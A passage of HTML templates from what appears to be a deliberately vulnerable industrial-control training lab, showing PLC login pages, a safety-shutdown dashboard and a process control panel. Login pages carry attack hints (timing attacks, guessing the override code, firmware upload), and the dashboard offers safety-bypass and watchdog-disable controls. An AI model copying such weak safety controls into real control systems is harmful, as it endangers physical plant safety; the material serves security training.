            text-align: center;
            color: #666;
            font-size: 12px;
            margin-bottom: 20px;
        }
        .error {
            background: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #d32f2f;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        button:hover {
            background: #c62828;
        }
        .info {
            margin-top: 20px;
            padding: 15px;
            background: #f5f5f5;
            border-radius: 5px;
            font-size: 12px;
        }
        .vuln-hint {
            color: #d32f2f;
            font-size: 11px;
            margin-top: 10px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>ðŸŒ¡ï¸ PLC-3 Access</h1>
        <div class="plc-id">Temperature Control System</div>

        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}

        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>

        <div class="info">
            <strong>System Information:</strong><br>
            Model: VulnPLC-3000-TEMP<br>
            Firmware: v2.1.0<br>
            Port: 5012 (HTTP) / 5504 (Modbus)
        </div>

        <div class="vuln-hint">
            Hint: Check firmware upload and config export/import
        </div>
    </div>
</body>
</html>



================================================================================
FILE: templates/plc4_dashboard.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>PLC-4: Safety/ESD Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #fff;
        }
        .header {
            background: linear-gradient(135deg, #c62828 0%, #b71c1c 100%);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
            border-bottom: 3px solid #ff9800;
        }
        .header h1 { font-size: 24px; }
        .container {
            padding: 30px;
            max-width: 1600px;
            margin: 0 auto;
        }
        .alert-banner {
            background: #ff9800;
            color: #000;
            padding: 15px;
            text-align: center;
            font-weight: bold;
            margin-bottom: 20px;
            border-radius: 5px;
            font-size: 18px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .card {
            background: #1a1a1a;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            border: 1px solid #333;
        }
        .card.critical {
            border: 2px solid #ff9800;
            background: rgba(255, 152, 0, 0.05);
        }
        .card h2 {
            font-size: 18px;
            margin-bottom: 15px;
            color: #ff6b6b;
        }
        .status-indicator {
            display: inline-block;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-indicator.on { background: #4caf50; }
        .status-indicator.off { background: #666; }
        .status-indicator.alarm { background: #f44336; animation: blink 1s infinite; }
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.3; }
        }
        .estop-button {
            width: 100%;
            padding: 30px;
            background: #f44336;
            color: white;
            border: 5px solid #d32f2f;
            border-radius: 10px;
            cursor: pointer;
            font-size: 24px;
            font-weight: bold;
            margin: 15px 0;
            text-transform: uppercase;
        }
        .estop-button:hover {
            background: #d32f2f;
            transform: scale(1.02);
        }
        .estop-button:active {
            transform: scale(0.98);
        }
        button {
            padding: 10px 20px;
            background: #1e88e5;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover { background: #1565c0; }
        button.danger { background: #f44336; }
        button.danger:hover { background: #d32f2f; }
        button.warning { background: #ff9800; }
        button.warning:hover { background: #f57c00; }
        .control-group {
            margin: 15px 0;
            padding: 10px;
            background: #0a0a0a;
            border-radius: 5px;
        }
        .control-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #b0bec5;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            background: #333;
            border: 1px solid #555;
            color: #fff;
            border-radius: 5px;
        }
        .alarm-list {
            max-height: 200px;
            overflow-y: auto;
        }
        .alarm-item {
            padding: 10px;
            margin: 5px 0;
            background: rgba(244, 67, 54, 0.2);
            border-left: 4px solid #f44336;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>ðŸ›¡ï¸ PLC-4: Safety/Emergency Shutdown System</h1>
        <div>User: {{ username }} | <a href="/logout" style="color: white;">Logout</a></div>
    </div>

    <div class="container">
        <div id="master-alarm" style="display: none;">
            <div class="alert-banner">
                âš ï¸ MASTER EMERGENCY STOP ACTIVATED âš ï¸
            </div>
        </div>

        <div class="grid">
            <!-- Emergency Stops -->
            <div class="card critical">
                <h2>Emergency Stops</h2>
                <button class="estop-button" onclick="triggerEmergencyStop()">
                    â¹ï¸ MASTER EMERGENCY STOP
                </button>
                <div class="control-group">
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="estop1-status"></span>
                        E-Stop 1: <span id="estop1-text">NORMAL</span>
                    </div>
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="estop2-status"></span>
                        E-Stop 2: <span id="estop2-text">NORMAL</span>
                    </div>
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="estop3-status"></span>
                        E-Stop 3: <span id="estop3-text">NORMAL</span>
                    </div>
                </div>
                <button onclick="resetAllAlarms()">Reset All Alarms</button>
            </div>

            <!-- Safety Interlocks -->
            <div class="card">
                <h2>Safety Interlocks</h2>
                <div class="control-group">
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="interlock1-status"></span>
                        Interlock 1: <span id="interlock1-text">SAFE</span>
                    </div>
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="interlock2-status"></span>
                        Interlock 2: <span id="interlock2-text">SAFE</span>
                    </div>
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="interlock3-status"></span>
                        Interlock 3: <span id="interlock3-text">SAFE</span>
                    </div>
                </div>
            </div>

            <!-- Fire Detection -->
            <div class="card">
                <h2>Fire Detection & Suppression</h2>
                <div class="control-group">
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="fire1-status"></span>
                        Zone 1: <span id="fire1-text">NORMAL</span>
                    </div>
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="fire2-status"></span>
                        Zone 2: <span id="fire2-text">NORMAL</span>
                    </div>
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="fire3-status"></span>
                        Zone 3: <span id="fire3-text">NORMAL</span>
                    </div>
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="suppression-status"></span>
                        Suppression: <span id="suppression-text">STANDBY</span>
                    </div>
                </div>
                <button class="warning" onclick="simulateIncident('fire')">Simulate Fire</button>
            </div>

            <!-- Gas Detection -->
            <div class="card">
                <h2>Gas Detection</h2>
                <div class="control-group">
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="gas1-status"></span>
                        Zone 1: <span id="gas1-text">NORMAL</span>
                    </div>
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="gas2-status"></span>
                        Zone 2: <span id="gas2-text">NORMAL</span>
                    </div>
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="evacuation-status"></span>
                        Evacuation Alarm: <span id="evacuation-text">INACTIVE</span>
                    </div>
                </div>
                <button class="warning" onclick="simulateIncident('gas')">Simulate Gas Leak</button>
            </div>

            <!-- System Status -->
            <div class="card">
                <h2>System Status</h2>
                <div class="control-group">
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="watchdog-status"></span>
                        Watchdog: <span id="watchdog-text">ENABLED</span>
                    </div>
                    <div style="margin: 10px 0;">
                        <span class="status-indicator" id="health-status"></span>
                        System Health: <span id="health-text">HEALTHY</span>
                    </div>
                    <div style="margin: 10px 0;">
                        Critical Alarms: <span id="alarm-count">0</span>
                    </div>
                </div>
                <button onclick="toggleWatchdog(true)">Enable Watchdog</button>
                <button onclick="toggleWatchdog(false)" class="warning">Disable Watchdog</button>
                <button onclick="resetWatchdog()">Reset Watchdog</button>
            </div>

            <!-- Dangerous Controls -->
            <div class="card critical">
                <h2>âš ï¸ Advanced Controls</h2>
                <div class="control-group">
                    <label>Safety Override Code:</label>
                    <input type="text" id="override-code" placeholder="Enter 4-digit code">
                    <button class="danger" onclick="submitOverride()">Submit Override</button>
                </div>
                <div style="margin-top: 15px;">
                    <button class="danger" onclick="enableSafetyBypass()">Enable Safety Bypass</button>
                    <button class="warning" onclick="simulateIncident('multiple')">Simulate Multiple Incidents</button>
                </div>
                <p style="margin-top: 10px; font-size: 11px; color: #ff9800;">
                    âš ï¸ These controls can disable safety systems. Use with extreme caution!
                </p>
            </div>
        </div>

        <!-- Alarm Log -->
        <div class="card">
            <h2>Recent Alarms</h2>
            <div class="alarm-list" id="alarm-log"></div>
        </div>
    </div>

    <script>
        function updateStatus() {
            fetch('/api/status')
                .then(r => r.json())
                .then(data => {
                    const state = data.state;

                    // Master emergency stop banner
                    if (state.master_emergency_stop) {
                        document.getElementById('master-alarm').style.display = 'block';
                    } else {
                        document.getElementById('master-alarm').style.display = 'none';
                    }

                    // Emergency stops
                    updateIndicator('estop1', state.emergency_stop_1, 'ACTIVE', 'NORMAL');
                    updateIndicator('estop2', state.emergency_stop_2, 'ACTIVE', 'NORMAL');
                    updateIndicator('estop3', state.emergency_stop_3, 'ACTIVE', 'NORMAL');

                    // Safety interlocks
                    updateIndicator('interlock1', state.safety_interlock_1, 'SAFE', 'UNSAFE', true);
                    updateIndicator('interlock2', state.safety_interlock_2, 'SAFE', 'UNSAFE', true);
                    updateIndicator('interlock3', state.safety_interlock_3, 'SAFE', 'UNSAFE', true);

                    // Fire detection
                    updateIndicator('fire1', state.fire_detection_zone1, 'FIRE!', 'NORMAL');
                    updateIndicator('fire2', state.fire_detection_zone2, 'FIRE!', 'NORMAL');
                    updateIndicator('fire3', state.fire_detection_zone3, 'FIRE!', 'NORMAL');
                    updateIndicator('suppression', state.fire_suppression_active, 'ACTIVE', 'STANDBY');

                    // Gas detection
                    updateIndicator('gas1', state.gas_detection_zone1, 'GAS!', 'NORMAL');
                    updateIndicator('gas2', state.gas_detection_zone2, 'GAS!', 'NORMAL');
                    updateIndicator('evacuation', state.evacuation_alarm, 'EVACUATE!', 'INACTIVE');

                    // System status
                    updateIndicator('watchdog', state.watchdog_enabled, 'ENABLED', 'DISABLED', true);
                    updateIndicator('health', state.system_healthy, 'HEALTHY', 'FAULT', true);

                    document.getElementById('alarm-count').textContent = state.critical_alarm_count || 0;
                });
        }

        function updateIndicator(id, state, onText, offText, invertAlarm = false) {
            const statusElem = document.getElementById(id + '-status');
            const textElem = document.getElementById(id + '-text');

            statusElem.className = 'status-indicator';
            if (state) {
                statusElem.classList.add(invertAlarm ? 'on' : 'alarm');
                textElem.textContent = onText;
            } else {
                statusElem.classList.add(invertAlarm ? 'alarm' : 'off');
                textElem.textContent = offText;
            }
        }

        function triggerEmergencyStop() {
            if (confirm('Trigger MASTER EMERGENCY STOP? This will shut down ALL systems!')) {
                fetch('/api/emergency_shutdown', {
                    method: 'POST'
                }).then(r => r.json()).then(data => {
                    alert(data.message);
                    updateStatus();
                });
            }
        }

        function resetAllAlarms() {
            fetch('/api/control', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({action: 'reset_all_alarms', value: true})
            }).then(() => updateStatus());
        }

        function toggleWatchdog(enable) {
            fetch('/api/control', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({action: 'watchdog_enabled', value: enable})
            }).then(() => {
                alert('Watchdog ' + (enable ? 'enabled' : 'disabled'));
                updateStatus();
            });
        }

        function resetWatchdog() {
            fetch('/api/control', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({action: 'reset_watchdog', value: true})
            }).then(() => alert('Watchdog reset'));
        }

        function submitOverride() {
            const code = document.getElementById('override-code').value;
            const formData = new FormData();
            formData.append('code', code);

            fetch('/api/safety_override', {
                method: 'POST',
                body: formData
            }).then(r => r.json()).then(data => {
                if (data.success) {
                    alert(data.message + '\n\n' + data.warning);
                } else {
                    alert('Override failed: ' + (data.error || 'Unknown error') + '\n' + (data.hint || ''));
                }
            });
        }

        function enableSafetyBypass() {
            if (confirm('Enable SAFETY BYPASS MODE? This will disable ALL safety systems!')) {
                fetch('/api/control', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({action: 'safety_bypass_mode', value: true})
                }).then(r => r.json()).then(data => {
                    alert(data.warning || 'Safety bypass enabled');
                });
            }
        }

        function simulateIncident(type) {
            const formData = new FormData();
            formData.append('type', type);

            fetch('/api/simulate_incident', {
                method: 'POST',
                body: formData
            }).then(r => r.json()).then(data => {
                alert('Incident simulated: ' + data.incident);
                updateStatus();
            });
        }

        setInterval(updateStatus, 1000);
        updateStatus();
    </script>
</body>
</html>



================================================================================
FILE: templates/plc4_login.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>PLC-4: Safety System Login</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #c62828 0%, #b71c1c 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            width: 350px;
            border: 3px solid #ff9800;
        }
        h1 {
            color: #c62828;
            text-align: center;
            margin-bottom: 10px;
            font-size: 24px;
        }
        .plc-id {
            text-align: center;
            color: #666;
            font-size: 12px;
            margin-bottom: 20px;
        }
        .warning-banner {
            background: #ff9800;
            color: #000;
            padding: 10px;
            text-align: center;
            font-weight: bold;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        .error {
            background: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #c62828;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
            font-weight: bold;
        }
        button:hover {
            background: #b71c1c;
        }
        .info {
            margin-top: 20px;
            padding: 15px;
            background: #fff3e0;
            border-radius: 5px;
            font-size: 12px;
            border-left: 4px solid #ff9800;
        }
        .vuln-hint {
            color: #c62828;
            font-size: 11px;
            margin-top: 10px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="warning-banner">âš ï¸ SAFETY CRITICAL SYSTEM âš ï¸</div>
        <h1>ðŸ›¡ï¸ PLC-4 Access</h1>
        <div class="plc-id">Emergency Shutdown System</div>

        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}

        <form method="POST">
            <input type="text" name="username" placeholder="Username" required autocomplete="off">
            <input type="password" name="password" placeholder="Password" required autocomplete="off">
            <button type="submit">LOGIN TO SAFETY SYSTEM</button>
        </form>

        <div class="info">
            <strong>System Information:</strong><br>
            Model: VulnPLC-4000-ESD<br>
            Firmware: v3.0.1<br>
            Port: 5013 (HTTP) / 5505 (Modbus)<br>
            Status: <span style="color: #4caf50; font-weight: bold;">ARMED</span>
        </div>

        <div class="vuln-hint">
            Hint: Try timing attacks or guess the override code
        </div>
    </div>
</body>
</html>



================================================================================
FILE: templates/process.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>Process Control - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 20px;
            color: #2c3e50;
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
        }
        .controls-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }
        .control-group {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border: 1px solid #ddd;
        }
        .control-group h3 {
            margin-bottom: 15px;
            color: #2c3e50;
        }
        .switch-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 15px 0;
        }
        .switch {
            position: relative;
            display: inline-block;
            width: 60px;
            height: 34px;
        }
        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 34px;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 26px;
            width: 26px;
            left: 4px;
            bottom: 4px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        input:checked + .slider {
            background-color: #2ecc71;
        }
        input:checked + .slider:before {
            transform: translateX(26px);
        }
        .slider-input {
            width: 100%;
            margin: 15px 0;
        }
        input[type="range"] {
            width: 100%;
            height: 8px;
            border-radius: 5px;
            background: #d3d3d3;
            outline: none;
        }
        input[type="range"]::-webkit-slider-thumb {
            appearance: none;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: #3498db;
            cursor: pointer;
        }
        .value-display {
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            color: #3498db;
            margin: 10px 0;
        }
        .btn {
            padding: 12px 24px;
            background: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 10px;
        }
        .btn:hover {
            background: #2980b9;
        }
        .btn.danger {
            background: #e74c3c;
        }
        .btn.danger:hover {
            background: #c0392b;
        }
        .status-badge {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
        }
        .status-badge.on {
            background: #d4edda;
            color: #155724;
        }
        .status-badge.off {
            background: #f8d7da;
            color: #721c24;
        }
        /* Security Alert Banner Styles */
        .alert-banner {
            position: fixed;
            top: 60px;
            left: 0;
            right: 0;
            padding: 15px 30px;
            display: none;
            align-items: center;
            justify-content: space-between;
            z-index: 1000;
            animation: slideDown 0.3s ease-out;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .alert-banner.show {
            display: flex;
        }
        .alert-banner.critical {
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
            animation: pulse 1s infinite;
        }
        .alert-banner.warning {
            background: linear-gradient(135deg, #f39c12, #e67e22);
            color: white;
        }
        .alert-banner.high {
            background: linear-gradient(135deg, #e67e22, #d35400);
            color: white;
        }
        .alert-content {
            display: flex;
            align-items: center;
            gap: 15px;
            flex: 1;
        }
        .alert-icon {
            font-size: 24px;
            animation: bounce 2s infinite;
        }
        .alert-message {
            flex: 1;
        }
        .alert-message .alert-type {
            font-weight: bold;
            font-size: 16px;
            display: block;
            margin-bottom: 5px;
        }
        .alert-message .alert-details {
            font-size: 14px;
            opacity: 0.9;
        }
        .alert-close {
            background: rgba(255,255,255,0.2);
            border: none;
            color: white;
            font-size: 20px;
            cursor: pointer;
            padding: 5px 15px;
            border-radius: 5px;
            transition: all 0.3s;
        }
        .alert-close:hover {
            background: rgba(255,255,255,0.3);
        }
        @keyframes slideDown {
            from {
                transform: translateY(-100%);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.9; }
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }
        .alert-history {
            background: #fff3cd;
            border-left: 4px solid #f39c12;
            padding: 10px 15px;
            margin-bottom: 15px;
            border-radius: 5px;
            font-size: 14px;
            display: none;
        }
        .alert-history.show {
            display: block;
        }
        .alert-history-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        .export-btn {
            background: #2ecc71;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 13px;
            transition: background 0.3s;
        }
        .export-btn:hover {
            background: #27ae60;
        }
        .alert-filters {
            display: flex;
            gap: 20px;
            margin-bottom: 10px;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 4px;
            flex-wrap: wrap;
            align-items: center;
        }
        .filter-group {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        .filter-group-title {
            font-weight: bold;
            font-size: 13px;
            color: #333;
            margin-bottom: 3px;
        }
        .filter-options {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .filter-checkbox {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 13px;
            cursor: pointer;
        }
        .filter-checkbox input[type="checkbox"] {
            cursor: pointer;
        }
        .clear-filters-btn {
            background: #95a5a6;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 13px;
            transition: background 0.3s;
            margin-left: auto;
        }
        .clear-filters-btn:hover {
            background: #7f8c8d;
        }
        .alert-count {
            font-size: 12px;
            color: #7f8c8d;
            margin-left: 10px;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>âš™ï¸ Process Control Panel</h1>
        <div>
            <a href="/dashboard">Dashboard</a>
            <a href="/hmi">HMI</a>
            <a href="/scada">SCADA</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <!-- Security Alert Banner -->
    <div id="alertBanner" class="alert-banner">
        <div class="alert-content">
            <span class="alert-icon">ðŸš¨</span>
            <div class="alert-message">
                <span class="alert-type" id="alertType">SECURITY ALERT</span>
                <span class="alert-details" id="alertDetails">Unauthorized access detected</span>
            </div>
        </div>
        <button class="alert-close" onclick="dismissAlert()">Ã—</button>
    </div>

    <div class="container">
        <!-- Alert History Section -->
        <div id="alertHistory" class="alert-history">
            <div class="alert-history-header">
                <strong>âš ï¸ Recent Security Events: <span id="alertCount" class="alert-count"></span></strong>
                <button class="export-btn" onclick="exportAlerts()">ðŸ“¥ Export to CSV</button>
            </div>

            <!-- Alert Filters -->
            <div class="alert-filters">
                <div class="filter-group">
                    <div class="filter-group-title">Filter by PLC:</div>
                    <div class="filter-options">
                        <label class="filter-checkbox">
                            <input type="checkbox" id="filter-plc1" checked onchange="applyFilters()">
                            <span>PLC-1</span>
                        </label>
                        <label class="filter-checkbox">
                            <input type="checkbox" id="filter-plc2" checked onchange="applyFilters()">
                            <span>PLC-2</span>
                        </label>
                        <label class="filter-checkbox">
                            <input type="checkbox" id="filter-plc3" checked onchange="applyFilters()">
                            <span>PLC-3</span>
                        </label>
                        <label class="filter-checkbox">
                            <input type="checkbox" id="filter-plc4" checked onchange="applyFilters()">
                            <span>PLC-4</span>
                        </label>
                    </div>
                </div>

                <div class="filter-group">
                    <div class="filter-group-title">Filter by Severity:</div>
                    <div class="filter-options">
                        <label class="filter-checkbox">
                            <input type="checkbox" id="filter-critical" checked onchange="applyFilters()">
                            <span>ðŸš¨ CRITICAL</span>
                        </label>
                        <label class="filter-checkbox">
                            <input type="checkbox" id="filter-warning" checked onchange="applyFilters()">
                            <span>âš ï¸ WARNING</span>
                        </label>
                        <label class="filter-checkbox">
                            <input type="checkbox" id="filter-high" checked onchange="applyFilters()">
                            <span>âš ï¸ HIGH</span>
                        </label>
                    </div>
                </div>

                <button class="clear-filters-btn" onclick="clearFilters()">Clear Filters</button>
            </div>

            <div id="alertHistoryContent"></div>
        </div>
        <div class="card">
            <h2>Equipment Control</h2>
            <div class="controls-grid">
                <div class="control-group">
                    <h3>Pump Control</h3>
                    <div class="switch-container">
                        <span>Pump Status:</span>
                        <label class="switch">
                            <input type="checkbox" id="pump-switch" checked onchange="togglePump()">
                            <span class="slider"></span>
                        </label>
                    </div>
                    <div style="text-align: center; margin-top: 15px;">
                        <span class="status-badge on" id="pump-badge">RUNNING</span>
                    </div>
                </div>

                <div class="control-group">
                    <h3>Valve Control</h3>
                    <div class="switch-container">
                        <span>Valve Position:</span>
                        <label class="switch">
                            <input type="checkbox" id="valve-switch" onchange="toggleValve()">
                            <span class="slider"></span>
                        </label>
                    </div>
                    <div style="text-align: center; margin-top: 15px;">
                        <span class="status-badge off" id="valve-badge">CLOSED</span>
                    </div>
                </div>

                <div class="control-group">
                    <h3>Motor Speed Control</h3>
                    <div class="slider-input">
                        <input type="range" id="motor-slider" min="0" max="3000" value="1500" oninput="updateMotorSpeed()">
                    </div>
                    <div class="value-display" id="motor-value">1500 RPM</div>
                    <button class="btn" onclick="setMotorSpeed()">Apply Speed</button>
                </div>
            </div>
        </div>

        <div class="card">
            <h2>Process Operations</h2>
            <div class="controls-grid">
                <div class="control-group">
                    <h3>Tank Operations</h3>
                    <button class="btn" onclick="resetTank()">Reset Tank Level (50%)</button>
                    <button class="btn danger" onclick="drainTank()">Emergency Drain</button>
                </div>

                <div class="control-group">
                    <h3>System Operations</h3>
                    <button class="btn" onclick="startProcess()">Start Process</button>
                    <button class="btn danger" onclick="stopProcess()">Emergency Stop</button>
                </div>

                <div class="control-group">
                    <h3>Current Status</h3>
                    <div style="padding: 10px; background: #e8f4f8; border-radius: 5px;">
                        <p><strong>Tank Level:</strong> <span id="status-level">--</span>%</p>
                        <p><strong>Temperature:</strong> <span id="status-temp">--</span>Â°C</p>
                        <p><strong>Pressure:</strong> <span id="status-pressure">--</span> kPa</p>
                        <p><strong>Flow Rate:</strong> <span id="status-flow">--</span> L/min</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function togglePump() {
            const checked = document.getElementById('pump-switch').checked;
            control('pump', checked);
            updateBadge('pump-badge', checked, 'RUNNING', 'STOPPED');
        }

        function toggleValve() {
            const checked = document.getElementById('valve-switch').checked;
            control('valve', checked);
            updateBadge('valve-badge', checked, 'OPEN', 'CLOSED');
        }

        function updateMotorSpeed() {
            const value = document.getElementById('motor-slider').value;
            document.getElementById('motor-value').textContent = value + ' RPM';
        }

        function setMotorSpeed() {
            const value = document.getElementById('motor-slider').value;
            control('motor_speed', value);
        }

        function resetTank() {
            control('reset_tank', true);
        }

        function drainTank() {
            if (confirm('WARNING: This will drain the tank to 10%. Continue?')) {
                // Simulate by setting very low level
                alert('Emergency drain initiated');
            }
        }

        function startProcess() {
            control('pump', true);
            control('valve', true);
            document.getElementById('pump-switch').checked = true;
            document.getElementById('valve-switch').checked = true;
            updateBadge('pump-badge', true, 'RUNNING', 'STOPPED');
            updateBadge('valve-badge', true, 'OPEN', 'CLOSED');
        }

        function stopProcess() {
            if (confirm('WARNING: This will stop all equipment. Continue?')) {
                control('pump', false);
                control('valve', false);
                document.getElementById('pump-switch').checked = false;
                document.getElementById('valve-switch').checked = false;
                updateBadge('pump-badge', false, 'RUNNING', 'STOPPED');
                updateBadge('valve-badge', false, 'OPEN', 'CLOSED');
            }
        }

        function control(action, value) {
            fetch('/api/process/control', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({action: action, value: value})
            })
            .then(r => r.json())
            .then(data => {
                updateStatus();
            });
        }

        function updateBadge(id, isOn, onText, offText) {
            const badge = document.getElementById(id);
            badge.textContent = isOn ? onText : offText;
            badge.className = 'status-badge ' + (isOn ? 'on' : 'off');
        }

        function updateStatus() {
            fetch('/api/process/status')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('status-level').textContent = data.tank_level.toFixed(1);
                    document.getElementById('status-temp').textContent = data.temperature.toFixed(1);
                    document.getElementById('status-pressure').textContent = data.pressure.toFixed(1);
                    document.getElementById('status-flow').textContent = data.flow_rate.toFixed(1);
                });
        }

        // Update status every 3 seconds
        setInterval(updateStatus, 3000);
        updateStatus();

        // Security Alert System
        let currentAlert = null;
        let alertShown = false;
        let alertHistory = [];

        function checkSecurityAlerts() {
            fetch('/api/security/alerts')
                .then(r => r.json())
                .then(data => {
                    if (data.success && data.alerts && data.alerts.length > 0) {
                        const latest = data.alerts[data.alerts.length - 1];

                        // Show banner if new alert
                        if (!currentAlert || currentAlert.timestamp !== latest.timestamp) {
                            currentAlert = latest;
                            showAlert(latest);
                        }

                        // Update alert history
                        alertHistory = data.alerts;
                        updateAlertHistory();
                    }
                })
                .catch(err => console.error('Error checking alerts:', err));
        }

        function showAlert(alert) {
            const banner = document.getElementById('alertBanner');
            const alertType = document.getElementById('alertType');
            const alertDetails = document.getElementById('alertDetails');
            const alertIcon = document.querySelector('.alert-icon');

            // Set alert content
            alertType.textContent = alert.type.replace(/_/g, ' ');
            alertDetails.textContent = `[${alert.timestamp}] ${alert.message}`;

            // Set severity class and icon
            banner.className = 'alert-banner show ' + alert.severity.toLowerCase();

            if (alert.severity === 'CRITICAL') {
                alertIcon.textContent = 'ðŸš¨';
            } else if (alert.severity === 'HIGH') {
                alertIcon.textContent = 'âš ï¸';
            } else {
                alertIcon.textContent = 'âš ï¸';
            }

            // Play alert sound (optional - commented out to avoid annoyance)
            // if (alert.severity === 'CRITICAL') {
            //     playAlertSound();
            // }

            alertShown = true;
        }

        function dismissAlert() {
            const banner = document.getElementById('alertBanner');
            banner.classList.remove('show');
            alertShown = false;
        }

